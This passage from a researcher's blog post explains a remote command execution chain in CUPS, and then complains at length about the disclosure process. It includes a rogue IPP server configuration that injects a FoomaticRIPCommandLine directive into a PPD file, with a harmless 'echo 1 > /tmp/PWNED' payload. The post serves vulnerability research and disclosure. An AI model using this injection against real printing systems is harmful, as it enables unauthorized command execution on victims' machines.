href=\"https://github.com/Distrotech/foomatic-filters/commit/20f05ab502d9e7a5bef58de16eca82d3745a7ad9\"\u003ethis is the commit\u003c/a\u003e that fixed those CVEs. However, you might have noticed that this package is different and it’s called \u003ccode\u003efoomatic-filters\u003c/code\u003e. When \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters\"\u003efoomatic-filters was integrated in the CUPS system\u003c/a\u003e, this fix was \u003cstrong\u003enot\u003c/strong\u003e ported to CUPS, as it is possible to verify by the \u003ccode\u003e--ppd argument\u003c/code\u003e, initially removed as part of the fix, and \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-filters/blob/90f04657ad3cac36ca1bfa96f62f3878166bc8f6/filter/foomatic-rip/foomaticrip.c#L983\"\u003estill present in the code today\u003c/a\u003e. And in fact, we can find mentions of the \u003ccode\u003eFoomaticRIPCommandLine\u003c/code\u003e directive being leveraged for arbitrary command execution in the more recent \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35235\"\u003eCVE-2024-35235\u003c/a\u003e. \u003c/p\u003e\n\u003cp\u003eSo apparently \u003ccode\u003efoomatic-rip\u003c/code\u003e was a known issue (confirmed by the CUPS devs), but somehow it has not been fixed for … decades? \u003cstrong\u003eWhy is something that allows arbitrary commands in a generally untrusted context not considered a security issue worth fixing?\u003c/strong\u003e I’ll tell you why! Because \u003cstrong\u003eit’s very hard to fix\u003c/strong\u003e. According to the CUPS developers:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e… it is very difficult to limit what can be provided in the FoomaticRIPCommandLine line in the PPD file. REDACTED and the rest of the OpenPrinting team have been talking about ways to limit what can be done through Foomatic without breaking existing drivers - we can certainly recommend that people not use Foomatic, but there are likely hundreds of older printer models (before 2010) that are only supported through Foomatic.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eAnd many of those hundreds of models, really use this directive \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/search?q=repo:OpenPrinting/foomatic-db%20foomaticripcommandline\u0026amp;type=code\"\u003ein creative ways\u003c/a\u003e such as:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e*FoomaticRIPCommandLine: \u0026#34;(printf \u0026amp;apos;\\033%%-12345X@PJL\\n@PJL JOB\\n@PJL SET COPIES=\u0026amp;copies;\\n\u0026amp;apos;%G|perl -p -e \u0026#34;s/\\x26copies\\x3b/1/\u0026#34;);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e(gs -q -dBATCH -dPARANOIDSAFER -dNOPAUSE -dNOINTERPOLATE %B%A%C %D%E | perl -p -e \u0026#34;s/^\\x1b\\x25-12345X//\u0026#34; | perl -p -e \u0026#34;s/\\xc1\\x01\\x00\\xf8\\x31\\x44/\\x44/g\u0026#34;);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e(printf \u0026amp;apos;@PJL\\n@PJL EOJ\\n\\033%%-12345X\u0026amp;apos;)\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eI had no idea that this can happen every time you print something, and to be frank it’s quite scary. They \u003cstrong\u003ehave\u003c/strong\u003e to allow \u003ccode\u003eFoomaticRIPCommandLine\u003c/code\u003e to accept pretty much anything (including perl as you can see), or many printers will just stop working on UNIX.\u003c/p\u003e\n\u003ch2 id=\"Remote-Command-Execution-chain\"\u003e\u003ca href=\"#Remote-Command-Execution-chain\" class=\"headerlink\" title=\"Remote Command Execution chain\"\u003e\u003c/a\u003eRemote Command Execution chain\u003c/h2\u003e\u003cp\u003eSo, in theory, we should now be able to:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForce the target machine to connect back to our malicious IPP server.\u003c/li\u003e\n\u003cli\u003eReturn an IPP attribute string that will inject controlled PPD directives to the temporary file.\u003c/li\u003e\n\u003cli\u003eWait for a print job to be sent to our fake printer for the PPD directives, and therefore the command, to be executed.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eShall we? This is the configuration payload for the IPP server (this is a YAML file that you will be able to use with the next bettercap release and its new \u003ccode\u003ezeroconf\u003c/code\u003e and \u003ccode\u003eipp\u003c/code\u003e modules):\u003c/p\u003e\n\u003cfigure class=\"highlight yaml\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# ... other configuration removed for brevity ...\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# enables the IPP server\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"attr\"\u003eipp:\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e# this can be the name of an existing device\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e# in which case its original IPP record will be transparently hijacked\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"attr\"\u003eprinter-name:\u003c/span\u003e \u003cspan class=\"string\"\u003eEVIL_PRINTER\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e# where the magic happens, it\u0026#39;s important to preserve the new lines\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"attr\"\u003eprinter-privacy-policy-uri:\u003c/span\u003e \u003cspan class=\"string\"\u003e|\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"string\"\u003ehttps://www.google.com/\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"string\"\u003e*FoomaticRIPCommandLine:\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;echo 1 \u0026gt; /tmp/PWNED\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"string\"\u003e*cupsFilter2\u003c/span\u003e \u003cspan class=\"string\"\u003e:\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;application/pdf application/vnd.cups-postscript 0 foomatic-rip\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eYou can see how we’re returning a \u003ccode\u003eprinter-privacy-policy-uri\u003c/code\u003e attribute string (it can be any of the many attributes saved to the PPD) that will:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSet \u003ccode\u003eprinter-privacy-policy-uri\u003c/code\u003e to \u003ccode\u003e\u0026#34;https://www.google.com/\u0026#34;\u003c/code\u003e, close the PPD string with the double quote, and add a new line.\u003c/li\u003e\n\u003cli\u003eInject the \u003ccode\u003e*FoomaticRIPCommandLine: \u0026#34;echo 1 \u0026gt; /tmp/PWNED\u0026#34;\u003c/code\u003e line with our command in the PPD.\u003c/li\u003e\n\u003cli\u003eInject the \u003ccode\u003e*cupsFilter2 : \u0026#34;application/pdf application/vnd.cups-postscript 0 foomatic-rip\u003c/code\u003e line (notice the spaces before and after the colon and no closing double quotes) directive to instruct CUPS to execute \u003ccode\u003e/usr/lib/cups/filter/foomatic-rip\u003c/code\u003e (with our \u003ccode\u003eFoomaticRIPCommandLine\u003c/code\u003e) when a print job is sent.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/mrrobot.gif\" alt=\"finally\"/\u003e\u003c/p\u003e\n\u003cp\u003eIn this video you can see me on my attacker machine (on the left) using the first version of this exploit to attack my new laptop, a fully patched \u003ccode\u003eUbuntu 24.04.1 LTS\u003c/code\u003e running \u003ccode\u003ecups-browsed 2.0.1\u003c/code\u003e, and (finally!!!) achieving command execution:\u003c/p\u003e\n\u003cp\u003e\u003cvideo src=\"/images/2024/cups1/exploit.mp4\" width=\"100%\" controls=\"\"\u003e\u003c/video\u003e\u003c/p\u003e\n\u003ch2 id=\"Personal-Considerations\"\u003e\u003ca href=\"#Personal-Considerations\" class=\"headerlink\" title=\"Personal Considerations\"\u003e\u003c/a\u003ePersonal Considerations\u003c/h2\u003e\u003cp\u003eYou will maybe be thinking now \u003cem\u003e“wow, that’s a lot of stuff to read, code, RFCs, PDFs of forgotten standards, this research must have been so tiring”\u003c/em\u003e, but in reality this was a weekend worth of rabbit holes, this was \u003cstrong\u003ethe fun part\u003c/strong\u003e. The actual work, the heavy, boring stuff started when on September 5, after confirming my findings, I decided to open a security advisory on the OpenPrinting cups-browsed repository and do what to me was the right thing to do: responsible disclosure. \u003c/p\u003e\n\u003cp\u003eI won’t go into the details of the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8\"\u003einitial conversation\u003c/a\u003e, or the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5\"\u003eones\u003c/a\u003e \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6\"\u003ethat\u003c/a\u003e \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47\"\u003efollowed\u003c/a\u003e. You are free to read them (if they will ever open any of the threads and you are willing to read 50+ pages of conversations) or not, and make your own opinion. \u003c/p\u003e\n\u003cp\u003eWhile the research only took a couple of days, this part took 22. And this part was \u003cstrong\u003enot\u003c/strong\u003e fun. I will only say that to my personal experience, the responsible disclosure process is broken. That a lot is expected and taken for granted from the security researchers by triagers that behave like you have to “prove to be worth listening to” while in reality they barely care to process and understand what you are saying, only to realize you were right all along three weeks later (if at all).\u003c/p\u003e\n\u003cp\u003eTwo days for the research, 249 lines of text for the fully working exploit.\u003c/p\u003e\n\u003cp\u003eTwenty-two days of arguments, condescension, several \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/issues/36\"\u003egaslighting attempts\u003c/a\u003e (the things i’ve read these days … you have \u003cem\u003eno idea\u003c/em\u003e), more or less subtle personal attacks, dozens of emails and messages, more than 100 pages of text in total. Hours and hours and hours and hours and \u003cem\u003efucking hours\u003c/em\u003e. Not to mention somehow being judged by a big chunk of the infosec community with a tendency of talking and judging situations they simply don’t know.\u003c/p\u003e\n\u003cp\u003eLet that sink in for a moment … \u003cstrong\u003eWTAF\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eAnd we’re \u003cstrong\u003enot\u003c/strong\u003e talking about time spent on fixes while I was impatient and throwing a tantrum on twitter. The \u003cem\u003eactual fixes\u003c/em\u003e (or a part of them) started being pushed much later. The vast majority of the time has been spent arguing whether or not these were issues worth considering. While I was trying to report that there’s something bad that should be addressed asap, the devs were being dismissive (and pushing other code, also vulnerable, for other functionalities instead of fixing) because I dared to criticize the design of their software. While at the same time I was trying to reach out privately to de-escalate and assure whoever was getting offended that my intent was not adversarial:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/email.jpg\" alt=\"email\"/\u003e\u003c/p\u003e\n\u003cp\u003eTo the people that more or less directly questioned my integrity, accused me of spectacularization and of spreading FUD on my socials: I don’t do this for a living. I don’t need CVEs to get a job or to prove how good my \u003cem\u003ekung-fu\u003c/em\u003e is. Or any attention other than what my projects and research already provide. I don’t play InfoSec Influencer™ like many. To put it like \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://x.com/JavierGonzalez/status/1838730623982186773\"\u003eJavier beautifully put it\u003c/a\u003e, my mission was to interrupt the triagers focus until they re-prioritized. When I saw that what I thought was pretty serious was being dismissed as an annoyance, I used the only platform I had plus a pinch of drama as a tool to have them fucking re-prioritize. And it worked, wonderfully, more fixes happened after two tweets than with all the arguing and talking, so 🤷.\u003c/p\u003e\n\u003cp\u003eDon’t hate me, hate the system that forced me to do that in order to be taken seriously.\u003c/p\u003e\n\u003ch3 id=\"About-the-9-9-CVSS\"\u003e\u003ca href=\"#About-the-9-9-CVSS\" class=\"headerlink\" title=\"About the 9.9 CVSS\"\u003e\u003c/a\u003eAbout the 9.9 CVSS\u003c/h3\u003e\u003cp\u003eSomebody also accused of making things up, especially due to the 9.9 CVSS severity that I \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://x.com/evilsocket/status/1838169889330135132\"\u003eclaimed in this tweet\u003c/a\u003e. Granted, as \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://x.com/evilsocket/status/1838220677389656127\"\u003eI very transparently said in the thread\u003c/a\u003e, I’m really not familiar with CVSS scores, how they are assigned and so on. But here’s a screenshot from the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.kb.cert.org/vince\"\u003eVINCE report\u003c/a\u003e of the initial CVSS scores, including the 9.9, being estimated by a RedHat engineer (and also reviewed by another one):\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/cvss.png\" alt=\"cvss\"/\u003e\u003c/p\u003e\n\u003cp\u003eAs I said, I’m not an expert, and I think that the initial 9.9 was mostly due to the fact that the RCE is trivial to exploit and the package presence so widespread. Impact wise I wouldn’t classify it as a 9.9, but then again, what the hell do I know?\u003c/p\u003e\n\u003cp\u003eBy the way, \u003cstrong\u003eCERT’s VINCE either has a backdoor, or an inside leak, or has zero vetting on who they add to a disclosure\u003c/strong\u003e, because \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://breachforums.st/Thread-Undisclosed-Linux-Unauth-RCE-as-they-claim-Writeup-from-researcher?pid=844608#pid844608\"\u003ethere’s been a leak\u003c/a\u003e of the exact markdown report that I only shared there, including the exploit.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/leak.jpg\" alt=\"leak\"/\u003e\u003c/p\u003e\n\u003cp\u003eWhat a fucking circus.\u003c/p\u003e\n\u003ch2 id=\"One-More-Thing\"\u003e\u003ca href=\"#One-More-Thing\" class=\"headerlink\" title=\"One More Thing\"\u003e\u003c/a\u003eOne More Thing\u003c/h2\u003e\u003cp\u003eWhen initially I wrote \u003ccode\u003eexploit.py\u003c/code\u003e, it only sent the UDP packet and created the rogue IPP server. Then with time I started adding features to it, especially zeroconf advertising, and it became a tool. So at some point I decided to rewrite it in Go and integrate this new code in \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://bettercap.org/\"\u003ebettercap\u003c/a\u003e, giving it the ability to transparently impersonate any service advertised via zeroconf / Bonjour / Avahi on a LAN and doing interesting things with the TXT records and specific service attributes, like IPP. And I discovered other interesting stuff :)\u003c/p\u003e\n\u003cp\u003eIn part II of this series (date TBD since there’s another disclosure in process), we’ll see how to use these new bettercap modules (not yet released) to attack Apple macOS.\u003c/p\u003e\n\u003cp\u003eFor now, I hope you enjoyed part I, \u003cem\u003ehack the planet!\u003c/em\u003e\u003c/p\u003e\n\n    \u003c/div\u003e",
  "Date": "2024-09-26T14:51:30Z",
  "Author": "Simone Margaritelli"
}